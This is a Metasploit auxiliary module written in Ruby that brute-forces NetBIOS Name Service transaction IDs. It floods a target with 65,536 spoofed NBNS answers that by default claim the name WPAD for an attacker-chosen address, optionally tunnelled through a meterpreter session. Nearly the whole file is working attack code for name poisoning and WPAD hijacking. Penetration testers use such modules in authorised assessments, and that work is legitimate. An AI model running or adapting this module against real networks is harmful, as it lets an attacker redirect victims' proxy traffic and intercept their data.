##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  def initialize
    super(
      'Name'           => 'NetBIOS Name Brute Forcer',
      'Description'    => %q{
          This module simply brute forces the sequence number. It will NOT listen for NBNS requests.
          It can however be used locally or on any host where you can not bind to 137. Keep in mind
          that each packet is sent over the meterpreter session so it is not only slow but there will
          be ALLOT of data transfered.
      },
      'Author'     => [ 'vvalien' ],
      'License'    => MSF_LICENSE,
      'References' => [ ]
    )

    register_options([
      OptInt.new('SESSION', [false, "Set a session to tunnel this through... or not.", nil]),
      OptAddress.new('SPOOF_REMOTE', [ true, "IP address with which to SEND responses", nil]),
      OptAddress.new('SPOOF_LOCAL', [ true, "IP address with which to SPOOF responses", "127.0.0.1"]),
      OptString.new('NBNAME', [ true, "The NB Name to send to the client", "WPAD"]),
    ])
  end



 def run()
    # push through a session... 
    ourclient = nil
    if datastore['SESSION']
      ourclient = framework.sessions[datastore['SESSION']]
    end

    udp_sock = Rex::Socket::Udp.create( {
      'LocalHost' => datastore['CHOST'] || nil,
      'PeerHost'  => datastore['SPOOF_REMOTE'],
      'PeerPort' => 137,
      'Comm'     => ourclient,
      'Context' => {'Msf' => framework, 'MsfExploit' => self}
    })

    def make_nbname()
      tstore = ""
      datastore['NBNAME'].upcase.each_char { |c|
        tstore << ((c.ord >> 4)+('A'.ord)).chr + ((c.ord & 0xF) + 'A'.ord).chr
      }
      padding = "CA" * (15 - datastore['NBNAME'].length) + 'AA' + "\x00"
      encoded_name = "\x20" + tstore + padding
      return encoded_name
    end

    def make_packet(trans_id)
      pkt = trans_id +
        "\x85\x00"   + # Flags = response + authoratative + recursion desired
        "\x00\x00"   + # Questions = 0
        "\x00\x01"   + # Answer RRs = 1
        "\x00\x00"   + # Authority RRs = 0
        "\x00\x00"   + # Additional RRs = 0
        make_nbname  + # original query name
        "\x00\x20"   + # Type = NB ...whatever that means
        "\x00\x01"   + # Class = IN
        "\x00\x04\x93\xe0" + # TTL long time   # \x00\x00\xff\xff  # TODO: much shorter time
        "\x00\x06"   + # Datalength = 6
        "\x00\x00"   + # Flags B-node, unique
        ::IPAddr.new(datastore['SPOOF_LOCAL']).hton # a better way to do this? Rex::Socket.addr_aton()
      return pkt
    end

    # We will be pushing ALLOT of data through our meterp session!
    # Is there a way to generate it locally?
    begin
      (0..65535).each do |n|
        if ( n % 10000 ) == 0
          print_status("Sent 10k packets")
        end
        udp_sock.put(make_packet([n].pack('v')))
      end
    rescue ::Exception => e
      print_error("#{e.class} ... #{e}")
    end
  end
end
